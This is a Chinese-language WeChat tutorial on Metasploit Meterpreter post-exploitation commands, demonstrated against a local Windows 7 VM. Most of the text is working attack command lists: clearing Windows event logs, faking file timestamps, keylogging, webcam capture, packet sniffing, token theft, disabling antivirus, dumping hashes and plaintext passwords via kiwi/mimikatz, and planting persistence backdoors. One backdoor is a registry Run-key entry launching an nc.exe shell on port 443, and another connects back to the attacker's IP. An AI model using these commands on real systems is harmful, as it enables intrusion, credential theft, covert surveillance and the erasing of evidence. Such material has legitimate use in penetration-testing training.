> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/s6W7oGS9MBOLU0ADyg38Rw)

一、前言  

MSF 是当今安全专业人员免费提供的最有用的审计工具之一！！本篇为地基篇，都是基础必备知识，掌握它吧~

接下来我会介绍基本的认知 MSF，基础的架构，以及演示总结出我学整整一年安全来所会的 Metasploit meterpreter 基础知识告诉大家，分享者才是学习中的最大受益者！！

这里不会讲解一些枯燥的废话，需要专业术语方面的请百度，开始演示。

二、MSF 基础认知  

1. 体系框架

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib7te30DsCiadib7ohdfsw3hMAk51Bnmic79lHFpQrzwcZDGNGmaPLdicTvg/640?wx_fmt=png)

直接拿一张图给大家简单看一下 Metasploit 体系结构，该图是 google 找到的，清晰易懂；

2.Metasploit 文件系统

kali 是自带 Metasploit 的，如果需要在 windows 和 mac 环境下安装也可以的

```
https://www.metasploit.com/download    #官网下载安装即可
```

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib0ibmk6j0xbovm9yUGF1OpZG4tNd4l9d2KFoA8Z2NktZN0pVFzuUWO7A/640?wx_fmt=png)

这里花一分钟让自己熟悉它的文件系统和库：

```
该MSF文件系统是一个直观的方式布置：

data：Metasploit使用的可编辑文件
documentation：为框架提供文档
external：   源代码和第三方库
lib：框架代码库的'肉'
modules：实际的MSF模块
plugins：可以在运行时加载的插件
scripts：Meterpreter和其他脚本
tools：各种有用的命令行工具
```

核心文件包括 data、modules、scripts、tools、plugins

1) data  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibjVHkmC8KnI2icbz8ZbVOj0TYb1yJtudAM5CZemLbJQDH1oyibYvBBmNA/640?wx_fmt=png)

该文件里常用的的功能在 wordlists（字典）里面

2) modules  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibnIvavZjgibuQrAAAv525dDlrVibA6YdHezOlXcQulMP2OWOiaYKNbyRcg/640?wx_fmt=png)

该文件夹里包括了 msf 最核心的几个文件：

```
auxiliary #漏洞辅助模块一般是没有攻击载荷的漏洞攻击
encoders  #码器模块
evasion   #简单的反杀模块
exploits  #渗透攻击模块
nops      #空指令模块
payloads  #漏洞负载模块
```

3) scripts

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibgg1dxIOcL2zKgdPjylIvJr31uThPibCficiaaZaQv9r9iboVpOYrOA35tQ/640?wx_fmt=png)

该文件夹里面包含这各种脚本

4) tools  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibv5Uqy6iapQDBO35PT7Iun0sonbXpdvT1VCjCIYr2L5At3lpXFv9BZJw/640?wx_fmt=png)

该文件夹中存放着大量的使用工具

5) plugins

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibrCleU5UiauvKpcAsCXYjPaCPUBC5oB2VOIsnXKcn164icP08co0GiblWg/640?wx_fmt=png)

该文件夹放着大量插件

简单知道该文件系统是干嘛的就行，对渗透领域深入后可以利用找到该模块利用里面的代码！

三、后渗透必备命令  

这里演示环境：

攻击者：kali-2020.4

被攻击者：windows7

这里不会写怎么反弹 shell，怎么提权的，不会的百度~~~~

1. 系统命令

1) 基本系统命令

```
sessions -i <ID值>  #进入会话   -k  #杀死会话
background        #将当前会话放置后台
run            #执行已有的模块，输入run后按两下tab，列出已有的脚本
info     #查看已有模块信息
getuid     #查看权限 
getpid     #获取当前进程的pid
sysinfo   #查看目标机系统信息
ps       #查看当前活跃进程    kill <PID值> 杀死进程
idletime   #查看目标机闲置时间
reboot / shutdown   #重启/关机
shell     #进入目标机cmd shell
```

2) 开关键盘 / 鼠标

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibGNQibOtwQXxtxFyHHkl3mKqasibRpoHwkpdxWMQgzGsy0guRxLPVP85Q/640?wx_fmt=png)

```
uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘/鼠标
uictl disable mouse    #禁用鼠标
uictl disable keyboard  #禁用键盘
uictl enable mouse    #开启鼠标
uictl enable keyboard  #开启键盘
```

3) 摄像头命令  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibpNbeTtESVY5yrnUHG5p7EibnKzuhj4SRZlicWvUPs6UCegRdCgqIIGIQ/640?wx_fmt=png)

```
webcam_list     #查看摄像头
webcam_snap     #通过摄像头拍照
webcam_stream   #通过摄像头开启视频
```

如果系统不存在摄像头的话就会报错！  
这里控制 windows7 是我本地虚拟机环境，我禁用了 USB 虚拟接口。  
开启摄像头会弹出 web 页面，进行远程观看！  
拍摄的照片会存放在 / user/ascotbe / 目录下，会有提示！

4) 执行文件  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib3Ut4bhvXibicWbu3h3dvjdBLNhoy2sPAQgXveU5IoNoxjqJXBiaydbOFg/640?wx_fmt=png)

```
execute -H -i -f cmd.exe   #创建新进程cmd.exe，-H不可见，-i交互
```

还有个 - m 命令是在内存中运行~~

这里主要记住这个命令即可，创建的新进程对方无法可见，就是在电脑上打开了一个 cmd 新窗口…

5) 进程迁移  

```
getpid    # 获取当前进程的pid
ps     # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
```

演示：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibn7ADXjtwBET3kf80uXqyicjTnibq4Iv8CnBg1oPAXicic1fKEf8XdjzPnA/640?wx_fmt=png)

这里有两个进程：

```
1264  1148  explorer.exe   x64   1    dayu-PC\dayu  C:\Windows\explorer.exe
1396  488   svchost.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibvxPftibFkIWljSp7U7geuQd1LTtwgp65Rl0jyLZ4lnL2jkLOAb94jCg/640?wx_fmt=png)

可以看到如果两个进程的权限不同，也就是说该进程没有要注入的进程权限高的话，是没办法写入到其他进程中去的！！很直观的方法是看右边的数据！

这里 migrate 1264 成功将我们的 shell 攻击文件移植到了 explorer 的 PID 中，这是攻击常用注入的进程程序之一，主要作用是以后对方就算关机重启后，开启监听还是能继续获得反弹 shell 的！！

6) 清除日志  

后渗透后需要将日志痕迹清理：

```
clearev #清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限
```

执行命令前存在很多日志痕迹：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibkT8iakmw2x4HxjqfzXe9brQXTdZ0fb42f7x8gfERKkhWcpOb7ePeibcQ/640?wx_fmt=png)

执行后：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibANhpA4UJz7AqIlnAiaZN5YR47kZMdqjS0XcDF3I3GAkW2KntrZKfSXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibamXWKBqHo2zQNb4rO5PBQXDiaaZGVgOvmFibuuUj8dY1bCccDJ8FcFpQ/640?wx_fmt=png)

这里必须得是 system 权限！！！

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib4zH7mFmk5SrViavqq7JszZhoJhlv8lXib9v7jlRichibqEnQdsicxkjPQeQ/640?wx_fmt=png)

清理后会有一个日志清除记录！！

2. 文件命令

1) 基础文件系统命令

演示：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibz7rLOfS3bicAUjyaNduHr4Vr13j35pzdMibIZiaEaAUJslx1eyHZENM5g/640?wx_fmt=png)

```
getwd 或者 pwd     # 查看当前工作目录  
ls
cd
cat C://Users//dayu//Desktop//dayu.txt    # 查看文件内容
upload /root/Desktop/test-dayu.txt C://Users//dayu//Desktop    # 上传文件到目标机上
download C://Users//dayu//Desktop//dayu.txt /root/Desktop/    # 下载文件到本机上
edit C://Users//dayu//Desktop//1.txt     #会进入编辑模式，编辑或创建文件，没有的话，会新建文件
rm C://Users//dayu//Desktop//1.txt  #删除文件
mkdir lltest2      #只能在当前目录下创建文件夹
rmdir lltest2     #只能删除当前目录下文件夹
getlwd  或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp         #操作攻击者主机 切换目
```

2) 伪造时间戳

timestomp 命令存在好几个功能，这里记住`-v和-f`即可…

演示：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibdDoUmBLkF9gIFdGSSNT5HkALxibbnlKvjzFNicasZWbRfZs4Awzj31ow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibcqEOibYIFQBj9VgUu3lBIZCBtcoEdSqT0obbzTKYUznb547YJA4DoMA/640?wx_fmt=png)

```
timestomp -v C:/phpStudy/manual.chm     #查看时间戳
timestomp C://2.txt -f C://1.txt     #将1.txt的时间戳复制给2.txt
```

伪造时间信息，挺实用！

3) 搜索文件  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibsp2qFib4RQdHdpjZAXQ2icUU3ThiafmeqvKia5MTfntAbk2ibEOjCbiciaBfQ/640?wx_fmt=png)

```
search -f *dayu*.exe    #全局搜索dayu.exe这个文件
```

搜索速度还是很快的！

3、网络命令  

1) 基本命令

基础命令，自行演示：

```
ipconfig/ifconfig  #查看网卡信息
netstat –ano  #查看端口进程
arp      #查看ARP信息
getproxy   #查看代理信息
route   #查看路由
```

2) 端口转发

演示：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibR0fMxRxYLtfD5UjFQOV7dSa4j18FuzDmPC5QLSYxXEooCeQljW7NkQ/640?wx_fmt=png)

```
portfwd add -l 6666 -p 3389 -r 127.0.0.1   #将目标机的3389端口转发到本地6666端口
rdesktop 127.0.0.1:6666    #kali远程桌面使用6666端口
```

3) 添加路由  

演示：  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib0xxbv0pPj7WeQStnpQlj9C8NUyibt9h27icwMjh1md4qah0kxwia2j4nw/640?wx_fmt=png)

```
run autoroute -s 10.10.10.0/24  #添加到目标环境网络
run autoroute –p   #查看添加的路由
```

内网穿透必备！

```
run post/windows/gather/arp_scanner RHOSTS=10.10.10.0/24  #扫描整个段存活主机
run auxiliary/scanner/portscan/tcp RHOSTS=10.10.10.2 PORTS=3389  #检查IP是否开放3389
```

4) Socks4a 代理

配置 socks4a 模块：

```
msf> use auxiliary/server/socks4a 
msf > set srvhost 127.0.0.1
msf > set srvport 1080
msf > run
```

配置 proxychains：

```
vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080
```

最后 proxychains 使用 Socks4a 代理访问工具或者浏览器即可！

4. 信息收集  

最常用的脚本：  

```
/usr/share/metasploit-framework/modules/post/windows/gather
/usr/share/metasploit-framework/modules/post/linux/gather

解释：
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives   #查看分区
run post/windows/gather/enum_applications     #获取安装软件信息
run post/windows/gather/dumplinks         #获取最近的文件操作
run post/windows/gather/enum_ie          #获取IE缓存
run post/windows/gather/enum_chrome         #获取Chrome缓存
run post/windows/gather/enum_patches    #补丁信息
run post/windows/gather/enum_domain    #查找域控
```

这几个都是常用也高效的，查看到缓存可以收集邮箱登录等各平台客户用过的记录信息和账号密码，查看安装软件信息，补丁信息更好的进一步 EXP，或者找到域控信息等

5. 提权

1）getsystem

工作原理：

```
1、getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
2、getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
3、Windows服务已启动，导致与命名管道建立连接。
4、该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
```

然后用新收集的 SYSTEM 模拟令牌产生 cmd.exe，并且我们有一个 SYSTEM 特权进程…  
这里不是特别稳定…

2）bypassuac

内置多个 pypassuac 脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行 getsystem 获取系统权限，如：

```
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
```

演示：  

如使用 bypassuac.rb 脚本：

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibW6vgLEsXsW0BBiaSDOs1vJKa6qucdlvwZjZxEnjnjhLNpIbX2G6S5Pw/640?wx_fmt=png)

```
msf > use exploit/windows/local/bypassuac
msf > set SESSION 5      #选择当前会话
msf > run
```

大部分情况下直接使用`getsystem`是很难提权的，会提示管道内存问题、令牌问题、RPCSS 变体等阻碍提权，但如果利用 bypassuac 返回新会话，就非常稳定提权了… 实用

6. 内核提权

可先利用`enum_patches`模块收集补丁信息，然后查找可用的 exploits 进行提权，需要退出当前连接  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibFFk3twyVO1oicWbLDib6pe5TQEa9zM6ZQF7ytLb5ABGiaSwrAaL2Dz9fw/640?wx_fmt=png)

```
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf > use exploit/windows/....      #利用未打补丁的模块即可
msf > set SESSION 5
msf > exploit
```

7. 远程桌面 & 截图

```
enumdesktops    #查看可用的桌面
getdesktop      #获取当前meterpreter 关联的桌面
set_desktop     #设置meterpreter关联的桌面  -h查看帮助
screenshot    #截屏
use espia      #或者使用espia模块截屏  然后输入screengrab
run vnc      #使用vnc远程桌面连接，这方法有点问题，上传了exe但是启动不了
```

1）enumdesktops 查询

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibKTCzgCkCNOG3icsicZNA9K9HVRzK2lLC4mZ2icx4xPcwhiaZBurfPaPf1Q/640?wx_fmt=png)

```
meterpreter > enumdesktops 
Enumerating all accessible desktops
```

2）screenshot 截图

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibH1TGnS5mdKkdERVyPQ4brC4Rlt8whMQDyuGwpQDWmibuzmbM2Nwlf2A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib9KkJiaiaic31H6ScnFMKjRLmaPER4H7zfqflDGmmw1gdqydEpUhqib4fSg/640?wx_fmt=png)

清晰截图~~

3）espia 截图

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib4oUSdSiaZs1nibCQZjRGzPqLMOCU8Tor6C7Er34sXyBrr4uull6ia67Mg/640?wx_fmt=png)

```
meterpreter > use espia 
meterpreter > screengrab
```

利用 espia 模块会自动打开截图的图片，screenshot 不会自动打开，需要自行到 tmp 目录下打开！

8、开启 rdp & 添加用户

1）getgui  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibDet9lpauGjUeOf8CSWBP1dcNkib9ibcFSJ5dQNtHbwrS9TPTYLibEZWng/640?wx_fmt=png)

```
run getgui -e   #开启远程桌面
run getgui -u dayu1 -p 123456   #添加用户
run getgui -f 9999 –e   #3389端口转发到6661
```

该方法创建用户不稳定…

2）enable_rdp

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibEPozbD6hjrx1O7fk7jLlgQkhtdopHpGsDvUomLicUGdxFcu2iaVHtpLw/640?wx_fmt=png)

```
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=test PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=9998  #将3389端口转发到9998
```

enable_rdp 比 getgui 稳定性好太多，也更实用！！

9. 键盘记录

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibjJaicep2ZfI3QA0V5NaxIPoSyYvzSJvlaTrwOKiavfayTGfrTsubic2aQ/640?wx_fmt=png)

```
keyscan_start    #开始键盘记录
keyscan_dump     #导出记录数据
keyscan_stop   #结束键盘记录
```

注意：导出记录的话要在 keyscan_stop 命令之前，不然结束了就无法导出了

10、sniffer 抓包

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaibpiav3V5IhU9BBia9A8JVicL94QslxHf5T15B5y7XJDw9ya0AEuCnMsVgA/640?wx_fmt=png)

```
use sniffer
sniffer_interfaces     #查看网卡
sniffer_start 2       #选择网卡 开始抓包
sniffer_stats 2       #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2       #停止抓包
```

这里非常实用的抓包…

11. 注册表操作  

1）参数列表如下  

```
meterpreter > reg -h
Usage: reg [command] [options]
Interact with the target machine's registry.

OPTIONS:

    -d <opt>  The data to store in the registry value.#注册表中值的数据
    -h        Help menu.
    -k <opt>  The registry key path (E.g. HKLM\Software\Foo).#注册表键路径
    -r <opt>  The remote machine name to connect to (with current process credentials#要连接的远程计算机名称（使用当前进程凭据）
    -t <opt>  The registry value type (E.g. REG_SZ).#注册表值类型
    -v <opt>  The registry value name (E.g. Stuff).#注册表键名称
    -w        Set KEY_WOW64 flag, valid values [32|64].#设置32位注册列表还是64位
COMMANDS:

    enumkey  Enumerate the supplied registry key [-k <key>]#枚举可获得的键
    createkey  Create the supplied registry key  [-k <key>]#创建提供的注册表项
    deletekey  Delete the supplied registry key  [-k <key>]#删除提供的注册表项
    queryclass Queries the class of the supplied key [-k <key>]#查询键值数据
    setval Set a registry value [-k <key> -v <val> -d <data>]#设置键值
    deleteval  Delete the supplied registry value [-k <key> -v <val>]#删除提供的注册表值
    queryval Queries the data contents of a value [-k <key> -v <val>]#查询值的数据内容
```

2）注册表设置 nc 后门

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibXmLgkf4iaMbaox9Kbia857qcNtn2kvCaRzjMPWeZAOcgFcm2Kgjy1jow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibvFlDV2O6tjcXP41Ou1pEgFYT3ibmgOx67J077djqsQC0iaFVOskIz1PA/640?wx_fmt=png)

```
upload /root/Desktop/nc64.exe C://Users//dayu//Desktop   #上传nc,前面的是你要上传文件的位置
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C://Users//dayu//Desktop//nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值

nc -v 192.168.0.142 443  #攻击者连接nc后门
```

植入后门！  

12. 令牌操作

1) 假冒令牌

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibfqK7aNicVekK9TJyLMbib7YUOiatqB3mia8RkHgicJlOfkqIiccicKUv1FLuw/640?wx_fmt=png)

```
use incognito        #进入incognito模式
help incognito      #查看帮助
list_tokens -u        #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'    #假冒SYSTEM token,或者用下面的
#impersonate_token NT\ AUTHORITY\\SYSTEM   #不加单引号 需使用\\
execute -f cmd.exe -i –t            # -t 使用假冒的token执行或者直接shell
rev2self       #返回原始token
```

欺骗实用！  

2）steal_token 窃取令牌

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibWXMIWqg0EyUwEoZianjoic6Ronc9lu0D0MiaBSjNU5u2x6uj838HKv97g/640?wx_fmt=png)

```
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
```

这种方法如果不是 SYSTEM 权限的话是无法窃取 SYSTEM 权限的，只能窃取相关的权限

13. 关闭杀软  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibrEplm9iaW88FGcXWpibqSENQtdlDqJzd3uqvBJ2SCDw9T0k8Kz3BFQibw/640?wx_fmt=png)

```
meterpreter> run killav //这个脚本要小心使用，可能导致目标机器蓝屏死机
```

14. 密码抓取

1）hashdump 导出密码哈希  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibWPCT1ficuSPWVeltEDv91ESEbicdmYP87ZNxQds6Rnu8fmPUrcFfbfhA/640?wx_fmt=png)

```
run hashdump
```

hashdump 模块可以从 SAM 数据库中导出本地用户账号，该命令的使用需要系统权限

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibkZzrFuat2Y56HoGjHlCtXOicQVKxxClr7FSFA8vuUMXL9Xib309KWwfQ/640?wx_fmt=png)

```
run windows/gather/smart_hashdump
```

还可以使用以上命令，该命令的使用需要系统权限，该功能更强大，可以导出域内所有用户的 hash！！

smart_hashdump 还可以配合 PSExec 模块进行哈希攻击…

2）抓取自动登录的密码

很多用户习惯将计算机设置自动登录，可以使用以下抓取自动登录的用户名和密码

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibOZJuic3MJVEiawH33picRd4Ycy5ibzLWC7RibWApSJuokPOrTjH5eOtichDA/640?wx_fmt=png)

```
run windows/gather/credentials/windows_autologin
```

3）wiki 模块使用

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibpTOKz41O9fibUTOib4QmV8HXqdiabgf3Tlyzf2gd1bCru3BYrLW4ic5vvA/640?wx_fmt=png)

可以看到提示：

```
[!] Loaded x86 Kiwi on an x64 architecture
```

这里本来是要利用 mimikatz 进行密码获取的，但是发现现在 kiwi 把 mimikatz 包含进去了…

报错解释又得回归到 kiwi 原理上：

kiwi 模块同时支持 32 位和 64 位的系统，但是该模块默认是加载 32 位的系统，所以如果目标主机是 64 位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是 64 位的，则必须先查看系统进程列表，然后将 meterpreter 进程迁移到一个 64 位程序的进程中，才能加载 kiwi 并且查看系统明文。如果目标系统是 32 位的，则没有这个限制。

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib2IQZQqBiccfjL3iaxeC0v8WgRZdKLiaICQefaWkAklAJeZD9Htobrj68Q/640?wx_fmt=png)

所以这里随意找了个进程迁移进去…

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4Srhyaziaib8ic0kXsd6sTK5Sqhq5tC3pSxRRlfoaJFtU0Bvk0MwRzictX2NxYD7t4A/640?wx_fmt=png)

```
creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
```

可看到功能非常强大，这里就简单知道下能干嘛就行，kiwi_cmd 命令是包含了 mimikatz…  
后期会深入利用在渗透中的…

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibP9fXAjn68xBrLPXdW0dxzMZDj7od4GVdKZuEjYkY0gYg7icv719Dm1g/640?wx_fmt=png)

可看到利用 creds_all 查看到了所有信息，甚至是明文信息也看到了…

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibruDrteWBQzQ7TWJvmibrb1TqmvOnChJ3piaTk0GPicpwUUqsmk6Qsbabg/640?wx_fmt=png)

```
kiwi_cmd sekurlsa::logonpasswords
```

这里将 kiwi_cmd 理解为 mimikatz 即可… 通过 mimikatz 命令成功获得了明文密码…

15. 后门植入  

metasploit 自带的后门有两种方式启动的，一种是通过启动项启动 persistence，一种是通过服务启动 metsvc，另外还可以通过 persistence_exe 自定义后门文件。

1）persistence 启动项后门

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibksU1wzZZJnDbkxMASMQX4XWFbdhLmzaPLmhVD7BRoMb3gJOrf3PRYQ/640?wx_fmt=png)

```
run persistence –h  #查看帮助
run persistence -X -i 5 -p 4444 -r 192.168.175.145
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
```

可看到在目标机的 C:\Users\dayu\AppData\Local\Temp\ebagFvdP.vbs 下建立了 vbs 文件，开机会启动这个文件上面的 vbs 文件…

监听写反弹时间间隔是 5s 端口是 443 Metasploit 服务器 Ip 是 192.168.175.145。

缺点是容易被杀毒软件查杀！，建议思路是：

```
在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本
在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项
```

2）metsvc 服务后门  

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaiblUMexLf56hNddrUrHNealXEmgyr8DF5zmSw74JKrFich9AKNLsw1Cgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/hI7MtRK64kDw29w1Eic5Gh4u4SrhyaziaibKkJGgLKnt5CSsG9FuXUiajloZm7nWdGCBWXK6PImpzCxNyE02SIIaLQ/640?wx_fmt=png)

```
run metsvc –h   # 查看帮助
run metsvc –A   #自动安装后门
```

可看到自动在 C:\Users\dayu\AppData\Local\Temp\ccNTBztKL 生成三个文件，并把 Meterpreter 自动放在服务自启中

```
set payload windows/metsvc_bind_tcp
并把port设置31337端口即可...连接
```

两种方法都很简单，但是杀软不一定放行哦，哈哈~~

16. 扫描脚本

这里并不能少了扫描这个项目，因为现在大多数的信息收集都是有自己的可用工具，或者是 dir、御剑等等非常实用的工具，但是这里我还是提提吧… 也是功能之一，万一用上了…  

```
/usr/share/metasploit-framework/modules/auxiliary/scanner/
在这个目录下是扫描脚本，可以修改的
```

```
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login
常用的扫描脚本，枚举什么自己看文件名即可理解...
```

四、结束语

以上都是基础必须理解和会的思路和命令方法，大部分渗透人员都接触过 Metasploit 这款工具，多强大和实用我都体现出来了，不管是初学者还是资深者，都可以阅读。

这里只简单演示了 Metasploit-meterpreter 的基本功能，还有 Metasploit 一些思路：  
1、漏扫模块编写自己的扫描仪  
2、MSF 和 Nessus 联动合作，或进行各方面的漏扫等  
3、利用 Metasploit 写一个漏洞检查工具  
4、Metasploit 开发利用源码写 EXP  
5、开发 web 应用程序漏洞解决 Dot Defender 等  
6、嗅探、透视、隐身、无痕访问、爆破等等  
7、post 开发等等都可以操作…  
…

太多了，Metasploit 深入起来包罗万象，我也是学会了冰山一角，这篇文章如果对大家有帮助，那我写得就值得的，加油~

今天基础牢固就到这里，虽然基础，但是必须牢记于心。